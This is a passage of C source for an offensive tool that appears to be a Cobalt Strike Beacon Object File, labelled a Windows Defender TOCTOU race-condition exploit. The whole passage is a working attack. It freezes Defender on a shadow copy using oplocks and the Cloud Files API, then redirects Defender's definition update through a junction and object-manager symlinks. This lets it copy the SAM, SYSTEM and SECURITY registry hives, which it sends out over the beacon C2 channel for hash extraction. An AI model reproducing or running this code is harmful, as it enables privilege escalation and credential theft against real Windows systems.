    syncrootregistered = TRUE;

    hs = (HRESULT)g_pCfConnectSyncRoot(args->syncroot, callbackreg, &callbackctx,
        CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
    if (hs) { retval = ERROR_UNIDENTIFIED_ERROR; goto fvss_cleanup; }

    if (args->hlock) { CloseHandle(args->hlock); args->hlock = NULL; }

    WaitForSingleObject(callbackctx.hnotifywdaccess, INFINITE);

    ZeroMemory(&ovd, sizeof(ovd));
    ovd.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!ovd.hEvent) { retval = GetLastError(); goto fvss_cleanup; }
    DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING) { retval = GetLastError(); goto fvss_cleanup; }
    SetEvent(callbackctx.hnotifylockcreated);

    GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
    SetEvent(args->hvssready);
    WaitForSingleObject(args->hcleanupevent, INFINITE);

fvss_cleanup:
    if (hlock) CloseHandle(hlock);
    if (callbackctx.hnotifylockcreated) CloseHandle(callbackctx.hnotifylockcreated);
    if (callbackctx.hnotifywdaccess) CloseHandle(callbackctx.hnotifywdaccess);
    if (ovd.hEvent) CloseHandle(ovd.hEvent);
    if (syncrootregistered) {
        g_pCfDisconnectSyncRoot(cfkey);
        g_pCfUnregisterSyncRoot(args->syncroot);
    }
    return retval;
}

/* ============================================================================
 * Trigger WD to create a Volume Shadow Copy
 * ============================================================================ */

static BOOL TriggerWDForVS(HANDLE hreleaseevent, wchar_t* fullvsspath, wchar_t* syncrootOut)
{
    UUID uid;
    RPC_WSTR wuid;
    wchar_t workdir[MAX_PATH];
    wchar_t eicarfilepath[MAX_PATH];
    HANDLE hlock = NULL;
    wchar_t rstmgr[MAX_PATH];
    OVERLAPPED ovd;
    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
    DWORD nwf = 0;
    struct cloudworkerthreadargs cldthreadargs;
    DWORD tid = 0;
    HANDLE hthread = NULL, hthread2 = NULL;
    BOOL dircreated = FALSE, retval = TRUE;
    HANDLE hfile = NULL, trigger = NULL;
    DWORD exitcode = 0, waitres = 0;
    HANDLE hobj[2];

    ZeroMemory(&ovd, sizeof(ovd));
    ZeroMemory(&cldthreadargs, sizeof(cldthreadargs));

    rev(eicar);

    RPCRT4$UuidCreate(&uid);
    RPCRT4$UuidToStringW(&uid, &wuid);

    ExpandEnvironmentStringsW(L"%TEMP%\\", workdir, MAX_PATH);
    wcscat(workdir, (wchar_t*)wuid);
    wcscpy(eicarfilepath, workdir);
    wcscat(eicarfilepath, L"\\foo.exe");

    ExpandEnvironmentStringsW(L"%windir%\\System32\\RstrtMgr.dll", rstmgr, MAX_PATH);

    LOGINFO("Creating VSS snapshot...\n");

    hthread = CreateThread(NULL, 0, ShadowCopyFinderThread, (void*)fullvsspath, 0, &tid);
    if (!hthread) { LOGERR("ShadowCopyFinder thread failed\n"); retval = FALSE; goto tvss_cleanup; }

    dircreated = CreateDirectoryW(workdir, NULL);
    if (!dircreated) { LOGERR("CreateDirectory failed: %d\n", GetLastError()); retval = FALSE; goto tvss_cleanup; }

    hfile = CreateFileW(eicarfilepath, GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (!hfile || hfile == INVALID_HANDLE_VALUE) {
        LOGERR("Failed to create EICAR file: %d\n", GetLastError());
        retval = FALSE; goto tvss_cleanup;
    }

    if (!WriteFile(hfile, eicar, (DWORD)strlen(eicar), &nwf, NULL)) {
        LOGERR("Failed to write EICAR: %d\n", GetLastError());
        retval = FALSE; goto tvss_cleanup;
    }

    hlock = CreateFileW(rstmgr, GENERIC_READ | SYNCHRONIZE, 0, NULL,
        OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    if (!hlock || hlock == INVALID_HANDLE_VALUE) {
        LOGERR("Failed to open RstrtMgr.dll: %d\n", GetLastError());
        retval = FALSE; goto tvss_cleanup;
    }

    ovd.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!ovd.hEvent) { retval = FALSE; goto tvss_cleanup; }

    SetLastError(ERROR_SUCCESS);
    DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING) { retval = FALSE; goto tvss_cleanup; }

    /* Trigger Defender detection by re-opening the EICAR file */
    trigger = CreateFileW(eicarfilepath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (trigger && trigger != INVALID_HANDLE_VALUE) CloseHandle(trigger);

    LOGINFO("Waiting for oplock trigger (Defender scanning)...\n");
    GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
    LOGOK("Oplock triggered - VSS creation in progress\n");

    WaitForSingleObject(hthread, 30000);
    if (!GetExitCodeThread(hthread, &exitcode) || exitcode != 0) {
        LOGERR("VSS finder failed: exit code %d\n", exitcode);
        retval = FALSE; goto tvss_cleanup;
    }

    /* Set up sync root for Cloud Files freeze */
    {
        UUID uid2;
        RPC_WSTR wuid2;
        RPCRT4$UuidCreate(&uid2);
        RPCRT4$UuidToStringW(&uid2, &wuid2);

        GetTempPathW(MAX_PATH, cldthreadargs.syncroot);
        wcscat(cldthreadargs.syncroot, (wchar_t*)wuid2);
        CreateDirectoryW(cldthreadargs.syncroot, NULL);
    }

    cldthreadargs.hcleanupevent = hreleaseevent;
    cldthreadargs.hlock = hlock;
    cldthreadargs.hvssready = CreateEventW(NULL, FALSE, FALSE, NULL);

    if (syncrootOut) wcscpy(syncrootOut, cldthreadargs.syncroot);

    hthread2 = CreateThread(NULL, 0, FreezeVSS, &cldthreadargs, 0, &tid);
    if (!hthread2) { retval = FALSE; goto tvss_cleanup; }

    hobj[0] = hthread2;
    hobj[1] = cldthreadargs.hvssready;
    waitres = WaitForMultipleObjects(2, hobj, FALSE, INFINITE);
    if (waitres - WAIT_OBJECT_0 == 0) {
        LOGERR("FreezeVSS thread exited prematurely\n");
        retval = FALSE;
    } else {
        LOGOK("Defender frozen via Cloud Files oplock\n");
    }

tvss_cleanup:
    if (hthread) CloseHandle(hthread);
    if (hthread2) CloseHandle(hthread2);
    if (cldthreadargs.hvssready) CloseHandle(cldthreadargs.hvssready);
    if (ovd.hEvent) CloseHandle(ovd.hEvent);
    if (hfile) CloseHandle(hfile);
    if (dircreated) RemoveDirectoryW(workdir);
    return retval;
}

/* ============================================================================
 * RPC Worker Thread
 * ============================================================================ */

static DWORD WINAPI WDCallerThread(void* args)
{
    struct WDRPCWorkerThreadArgs* targs = (struct WDRPCWorkerThreadArgs*)args;
    if (!targs) return ERROR_BAD_ARGUMENTS;

    error_status_t errstat = 0;
    long stat = BH_CallWDUpdate(targs->rpcState, targs->dirpath, &errstat);
    targs->res = (RPC_STATUS)stat;

    if (targs->hevent)
        SetEvent(targs->hevent);

    return ERROR_SUCCESS;
}

/* ============================================================================
 * BOF Entry Point
 * ============================================================================ */

void go(char* args, int alen)
{
    formatp output;
    ARG_PARSER parser;
    BH_RPC_STATE rpcState;

    /* Leak targets (NT paths relative to VSS root) */
    const wchar_t* leakTargets[3];
    const wchar_t* leakNames[3];
    int leakCount = 0;
    const wchar_t* vdmfiles[] = { L"mpasbase.vdm", L"mpavbase.vdm", L"mpasdlta.vdm" };

    /* State variables */
    wchar_t fullvsspath[MAX_PATH];
    wchar_t syncroot[MAX_PATH];
    HANDLE hreleaseready = NULL;
    struct UpdateFiles* UpdateFilesList = NULL;
    struct UpdateFiles* UpdateFilesListCurrent = NULL;
    BOOL isvssready = FALSE;
    wchar_t updatepath[MAX_PATH];
    BOOL needupdatedircleanup = FALSE;
    BOOL dirmoved = FALSE;
    wchar_t newtmp[MAX_PATH];
    wchar_t newdefupdatedirname[MAX_PATH];
    HANDLE hdir = NULL;
    HANDLE hcurrentthread = NULL;
    HANDLE hthread = NULL;
    struct WDRPCWorkerThreadArgs threadargs;
    HANDLE hupdatefile = NULL;
    HANDLE hreparsedir = NULL;
    HANDLE hobjlinks[3] = { NULL, NULL, NULL };
    FILE_RENAME_INFO* fri = NULL;
    OVERLAPPED ovd, ov;
    DWORD tid = 0, transfersz = 0, retsz = 0;
    int i;

    BeaconFormatAlloc(&output, 16384);
    g_output = &output;
    arg_init(&parser, args, alen);

    ZeroMemory(fullvsspath, sizeof(fullvsspath));
    ZeroMemory(syncroot, sizeof(syncroot));
    ZeroMemory(&threadargs, sizeof(threadargs));
    ZeroMemory(&rpcState, sizeof(rpcState));
    ZeroMemory(&ovd, sizeof(ovd));
    ZeroMemory(&ov, sizeof(ov));

    LOG("============================================================\n");
    LOG("[*] BlueHammer File Leak BOF\n");
    LOG("[*] Defender TOCTOU Race Condition Exploit\n");
    LOG("============================================================\n");

    /* Parse arguments */
    {
        char* dump = arg_get(&parser, "dump");
        if (!dump || _stricmp(dump, "all") == 0) {
            leakTargets[0] = L"\\Windows\\System32\\Config\\SAM";
            leakTargets[1] = L"\\Windows\\System32\\Config\\SYSTEM";
            leakTargets[2] = L"\\Windows\\System32\\Config\\SECURITY";
            leakNames[0] = L"SAM"; leakNames[1] = L"SYSTEM"; leakNames[2] = L"SECURITY";
            leakCount = 3;
        } else if (_stricmp(dump, "sam") == 0) {
            leakTargets[0] = L"\\Windows\\System32\\Config\\SAM";
            leakNames[0] = L"SAM";
            leakCount = 1;
        } else if (_stricmp(dump, "system") == 0) {
            leakTargets[0] = L"\\Windows\\System32\\Config\\SYSTEM";
            leakNames[0] = L"SYSTEM";
            leakCount = 1;
        } else if (_stricmp(dump, "security") == 0) {
            leakTargets[0] = L"\\Windows\\System32\\Config\\SECURITY";
            leakNames[0] = L"SECURITY";
            leakCount = 1;
        } else {
            LOGERR("Invalid /dump value. Use: sam, system, security, or all\n");
            if (dump) free(dump);
            goto main_cleanup;
        }
        if (dump) free(dump);
    }

    /* Resolve function pointers */
    if (!ResolveNtdllFunctions()) {
        LOGERR("Failed to resolve ntdll functions\n"); goto main_cleanup;
    }
    if (!ResolveCldApiFunctions()) {
        LOGERR("Failed to resolve cldapi functions\n"); goto main_cleanup;
    }
    if (!BH_InitRpc(&rpcState)) {
        LOGERR("Failed to initialize RPC state\n"); goto main_cleanup;
    }

    /* Stage 1: Download Defender update files */
    UpdateFilesList = GetUpdateFiles();
    if (!UpdateFilesList) {
        LOGERR("Failed to download update files\n"); goto main_cleanup;
    }

    /* Stage 2-3: Create VSS + Freeze Defender */
    hreleaseready = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hreleaseready) goto main_cleanup;

    isvssready = TriggerWDForVS(hreleaseready, fullvsspath, syncroot);
    if (!isvssready) {
        LOGERR("Failed to create/freeze VSS\n"); goto main_cleanup;
    }
    LOGOK("VSS path: %ls\n", fullvsspath);

    /* Stage 4: Write update files and trigger RPC */
    {
        UUID uid;
        RPC_WSTR wuid;
        wchar_t envstr[MAX_PATH];

        RPCRT4$UuidCreate(&uid);
        RPCRT4$UuidToStringW(&uid, &wuid);
        wcscpy(envstr, L"%TEMP%\\");
        wcscat(envstr, (wchar_t*)wuid);
        ExpandEnvironmentStringsW(envstr, updatepath, MAX_PATH);
    }

    needupdatedircleanup = CreateDirectoryW(updatepath, NULL);
    if (!needupdatedircleanup) {
        LOGERR("Failed to create update directory: %d\n", GetLastError()); goto main_cleanup;
    }

    /* Write extracted .vdm files to update directory */
    UpdateFilesListCurrent = UpdateFilesList;
    while (UpdateFilesListCurrent) {
        wchar_t filepath[MAX_PATH];
        HANDLE hupdate;
        DWORD writtenbytes;

        wcscpy(filepath, updatepath);
        wcscat(filepath, L"\\");
        MultiByteToWideChar(CP_ACP, 0, UpdateFilesListCurrent->filename, -1,
            &filepath[wcslen(filepath)], MAX_PATH - (int)wcslen(filepath));

        hupdate = CreateFileW(filepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, CREATE_ALWAYS, 0, NULL);
        if (!hupdate || hupdate == INVALID_HANDLE_VALUE) {
            LOGERR("Failed to create update file: %d\n", GetLastError()); goto main_cleanup;
        }
        UpdateFilesListCurrent->filecreated = TRUE;
        if (!WriteFile(hupdate, UpdateFilesListCurrent->filebuff, UpdateFilesListCurrent->filesz, &writtenbytes, NULL)) {
            CloseHandle(hupdate);
            LOGERR("Failed to write update file: %d\n", GetLastError()); goto main_cleanup;
        }
        CloseHandle(hupdate);
        UpdateFilesListCurrent = UpdateFilesListCurrent->next;
    }

    /* Monitor Definition Updates directory for new subdirectory */
    hdir = CreateFileW(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
    if (!hdir || hdir == INVALID_HANDLE_VALUE) {
        LOGERR("Failed to open Definition Updates dir: %d\n", GetLastError()); goto main_cleanup;
    }

    hcurrentthread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, KERNEL32$GetCurrentThreadId());
    if (!hcurrentthread) goto main_cleanup;

    /* Launch RPC caller thread */
    threadargs.dirpath = updatepath;
    threadargs.hntfythread = hcurrentthread;
    threadargs.hevent = CreateEventW(NULL, FALSE, FALSE, NULL);
    threadargs.rpcState = &rpcState;
    hthread = CreateThread(NULL, 0, WDCallerThread, (LPVOID)&threadargs, 0, &tid);

    LOGINFO("Waiting for Defender to create new definition directory...\n");
    wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");

    /* Wait for new directory notification or RPC failure */
    {
        char buff[0x1000];
        DWORD retbytes = 0;
        BOOL gotdir = FALSE;

        while (!gotdir) {
            ZeroMemory(buff, sizeof(buff));
            OVERLAPPED od;
            ZeroMemory(&od, sizeof(od));
            od.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
            KERNEL32$ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
            HANDLE events[2] = { od.hEvent, threadargs.hevent };
            DWORD wr = WaitForMultipleObjects(2, events, FALSE, INFINITE);
            CloseHandle(od.hEvent);

            if (wr - WAIT_OBJECT_0 == 1) {
                LOGERR("RPC call failed: 0x%08X\n", threadargs.res); goto main_cleanup;
            }

            PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
            if (pfni->Action == FILE_ACTION_ADDED) {
                wcscat(newdefupdatedirname, pfni->FileName);
                gotdir = TRUE;
            }
        }
    }
    LOGOK("New definition dir: %ls\n", newdefupdatedirname);

    /* Stage 5: Oplock on mpasbase.vdm, then junction + symlink race */
    {
        wchar_t updatelibpath[MAX_PATH];
        UNICODE_STRING unistr;
        OBJECT_ATTRIBUTES objattr;
        IO_STATUS_BLOCK iostat;
        NTSTATUS ntstat;

        wcscpy(updatelibpath, L"\\??\\");
        wcscat(updatelibpath, updatepath);
        wcscat(updatelibpath, L"\\mpasbase.vdm");

        NTDLL$RtlInitUnicodeString(&unistr, updatelibpath);
        ZeroMemory(&objattr, sizeof(objattr));
        objattr.Length = sizeof(OBJECT_ATTRIBUTES);
        objattr.ObjectName = &unistr;
        objattr.Attributes = OBJ_CASE_INSENSITIVE;

        ntstat = NTDLL$NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE,
            &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, 0);
        if (ntstat) {
            LOGERR("Failed to open update library: 0x%08X\n", ntstat); goto main_cleanup;
        }

        ovd.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
        DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, 0, NULL, 0, NULL, &ovd);
        if (GetLastError() != ERROR_IO_PENDING) {
            LOGERR("Oplock request failed: %d\n", GetLastError()); goto main_cleanup;
        }

        LOGINFO("Waiting for oplock on update file...\n");
        GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
        LOGOK("Oplock triggered on update file\n");
    }

    /* Rename the update file to release it, then move directory */
    {
        wchar_t newname[MAX_PATH];
        DWORD renstructsz;

        wcscpy(newname, updatepath);
        wcscat(newname, L".WDFOO");
        renstructsz = sizeof(FILE_RENAME_INFO) + (DWORD)wcslen(newname) * sizeof(wchar_t) + sizeof(wchar_t);
        fri = (FILE_RENAME_INFO*)malloc(renstructsz);
        ZeroMemory(fri, renstructsz);
        fri->ReplaceIfExists = TRUE;
        fri->FileNameLength = (DWORD)wcslen(newname) * sizeof(wchar_t);
        wcscpy(&fri->FileName[0], newname);

        if (!KERNEL32$SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz)) {
            LOGERR("File rename failed: %d\n", GetLastError()); goto main_cleanup;
        }
        free(fri); fri = NULL;
    }

    /* Move original update directory and create junction in its place */
    wcscpy(newtmp, updatepath);
    wcscat(newtmp, L".foo");
    if (!MoveFileW(updatepath, newtmp)) {
        LOGERR("MoveFile failed: %d\n", GetLastError()); goto main_cleanup;
    }
    dirmoved = TRUE;

    /* Create junction: updatepath => \BaseNamedObjects\Restricted */
    {
        wchar_t wreparsedirpath[MAX_PATH];
        UNICODE_STRING reparsedirpath;
        OBJECT_ATTRIBUTES objattr;
        IO_STATUS_BLOCK iostat;
        NTSTATUS ntstat;
        wchar_t rptarget[] = L"\\BaseNamedObjects\\Restricted";
        wchar_t printname[1] = { L'\0' };
        size_t targetsz, printnamesz, pathbuffersz, totalsz;
        BH_REPARSE_DATA_BUFFER* rdb;
        DWORD cb;

        wcscpy(wreparsedirpath, L"\\??\\");
        wcscat(wreparsedirpath, updatepath);
        NTDLL$RtlInitUnicodeString(&reparsedirpath, wreparsedirpath);
        ZeroMemory(&objattr, sizeof(objattr));
        objattr.Length = sizeof(OBJECT_ATTRIBUTES);
        objattr.ObjectName = &reparsedirpath;
        objattr.Attributes = OBJ_CASE_INSENSITIVE;

        ntstat = NTDLL$NtCreateFile(&hreparsedir, GENERIC_WRITE | DELETE | SYNCHRONIZE,
            &objattr, &iostat, NULL, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE, NULL, 0);
        if (ntstat) {
            LOGERR("Failed to recreate update dir: 0x%08X\n", ntstat); goto main_cleanup;
        }

        targetsz = wcslen(rptarget) * 2;
        printnamesz = 1 * 2;
        pathbuffersz = targetsz + printnamesz + 12;
        totalsz = pathbuffersz + BH_REPARSE_DATA_BUFFER_HEADER_LENGTH;
        rdb = (BH_REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
        rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
        rdb->ReparseDataLength = (USHORT)pathbuffersz;
        rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetsz;
        memmove(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
        rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetsz + 2);
        rdb->MountPointReparseBuffer.PrintNameLength = (USHORT)printnamesz;
        memmove(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, printname, printnamesz);

        ov.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
        DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT, rdb, (DWORD)totalsz, NULL, 0, NULL, &ov);
        HeapFree(GetProcessHeap(), 0, rdb);
        if (GetLastError() == ERROR_IO_PENDING)
            GetOverlappedResult(hreparsedir, &ov, &retsz, TRUE);
        if (GetLastError() != ERROR_SUCCESS) {
            LOGERR("Failed to set reparse point: %d\n", GetLastError()); goto main_cleanup;
        }
        LOGOK("Junction created: %ls => %ls\n", updatepath, rptarget);
    }

    /* Stage 6: Create object manager symlinks for each target */
    for (i = 0; i < leakCount; i++) {
        wchar_t objlinknamestr[MAX_PATH];
        wchar_t nttargetfile[MAX_PATH];
        UNICODE_STRING linkname, linktarget;
        OBJECT_ATTRIBUTES objattr;
        NTSTATUS ntstat;

        wcscpy(objlinknamestr, L"\\BaseNamedObjects\\Restricted\\");
        wcscat(objlinknamestr, vdmfiles[i]);

        wcscpy(nttargetfile, fullvsspath);
        wcscat(nttargetfile, leakTargets[i]);

        NTDLL$RtlInitUnicodeString(&linkname, objlinknamestr);
        NTDLL$RtlInitUnicodeString(&linktarget, nttargetfile);
        ZeroMemory(&objattr, sizeof(objattr));
        objattr.Length = sizeof(OBJECT_ATTRIBUTES);
        objattr.ObjectName = &linkname;
        objattr.Attributes = OBJ_CASE_INSENSITIVE;

        ntstat = g_pNtCreateSymbolicLinkObject(&hobjlinks[i], GENERIC_ALL, &objattr, &linktarget);
        if (ntstat) {
            LOGERR("Symlink creation failed for %ls: 0x%08X\n", vdmfiles[i], ntstat); goto main_cleanup;
        }
        LOGOK("Symlink: %ls => %ls\n", objlinknamestr, nttargetfile);
    }

    /* Release handles to let Defender proceed */
    if (ov.hEvent) { CloseHandle(ov.hEvent); ov.hEvent = NULL; }
    if (ovd.hEvent) { CloseHandle(ovd.hEvent); ovd.hEvent = NULL; }
    if (hupdatefile) { CloseHandle(hupdatefile); hupdatefile = NULL; }
    if (hdir) { CloseHandle(hdir); hdir = NULL; }
    if (hreparsedir) { CloseHandle(hreparsedir); hreparsedir = NULL; }

    /* Stage 7: Read leaked files as Defender copies them */
    LOGINFO("Reading leaked files...\n");
    for (i = 0; i < leakCount; i++) {
        wchar_t readpath[MAX_PATH];
        HANDLE hleakedfile;
        LARGE_INTEGER filesize;
        DWORD bytesread;
        void* filebuf;
        OVERLAPPED ovd2;
        char downloadName[MAX_PATH];

        wcscpy(readpath, newdefupdatedirname);
        wcscat(readpath, L"\\");
        wcscat(readpath, vdmfiles[i]);

        /* Retry until Defender writes the file */
        do {
            hleakedfile = CreateFileW(readpath, GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        } while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);

        GetFileSizeEx(hleakedfile, &filesize);
        ZeroMemory(&ovd2, sizeof(ovd2));
        KERNEL32$LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, 0, filesize.LowPart, filesize.HighPart, &ovd2);

        filebuf = malloc((size_t)filesize.QuadPart);
        if (!filebuf) {
            LOGERR("Failed to allocate %lld bytes for leaked file\n", filesize.QuadPart);
            KERNEL32$UnlockFile(hleakedfile, 0, 0, 0, 0);
            CloseHandle(hleakedfile);
            goto main_cleanup;
        }

        ReadFile(hleakedfile, filebuf, (DWORD)filesize.QuadPart, &bytesread, NULL);
        KERNEL32$UnlockFile(hleakedfile, 0, 0, 0, 0);
        CloseHandle(hleakedfile);

        /* Download file over beacon channel */
        sprintf(downloadName, "%ls.bin", leakNames[i]);
        BeaconDownload(downloadName, (char*)filebuf, (unsigned int)filesize.QuadPart);
        LOGOK("Leaked %ls (%u bytes) - sent via beacon download\n", leakNames[i], bytesread);

        free(filebuf);
        if (hobjlinks[i]) { CloseHandle(hobjlinks[i]); hobjlinks[i] = NULL; }
    }

    LOG("============================================================\n");
    LOGOK("Exploit completed successfully!\n");
    LOG("[*] Leaked files sent via beacon download channel.\n");
    LOG("[*] Use secretsdump.py to extract hashes from SAM+SYSTEM.\n");
    LOG("============================================================\n");

    SetEvent(hreleaseready);

    /* Wait for RPC thread to finish */
    if (hthread) {
        WaitForSingleObject(hthread, INFINITE);
        CloseHandle(hthread); hthread = NULL;
    }

main_cleanup:
    if (hdir) CloseHandle(hdir);
    if (fri) free(fri);
    if (ov.hEvent) CloseHandle(ov.hEvent);
    if (ovd.hEvent) CloseHandle(ovd.hEvent);

    if (hreleaseready) {
        SetEvent(hreleaseready);
        Sleep(1000);
        CloseHandle(hreleaseready);
    }

    for (i = 0; i < 3; i++)
        if (hobjlinks[i]) CloseHandle(hobjlinks[i]);

    if (hcurrentthread) CloseHandle(hcurrentthread);
    if (hthread) CloseHandle(hthread);

    /* Clean up update files */
    if (needupdatedircleanup) {
        wchar_t dirtoclean[MAX_PATH];
        wcscpy(dirtoclean, dirmoved ? newtmp : updatepath);
        UpdateFilesListCurrent = UpdateFilesList;
        while (UpdateFilesListCurrent) {
            if (UpdateFilesListCurrent->filecreated) {
                wchar_t filetodel[MAX_PATH];
                wcscpy(filetodel, dirtoclean);
                wcscat(filetodel, L"\\");
                MultiByteToWideChar(CP_ACP, 0, UpdateFilesListCurrent->filename, -1,
                    &filetodel[wcslen(filetodel)], MAX_PATH - (int)wcslen(filetodel));
                DeleteFileW(filetodel);
            }
            struct UpdateFiles* old = UpdateFilesListCurrent;
            UpdateFilesListCurrent = UpdateFilesListCurrent->next;
            if (old->filebuff) free(old->filebuff);
            free(old);
        }
        RemoveDirectoryW(dirtoclean);
    }

    /* Clean up sync root directory */
    if (syncroot[0]) RemoveDirectoryW(syncroot);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
    g_output = NULL;
}
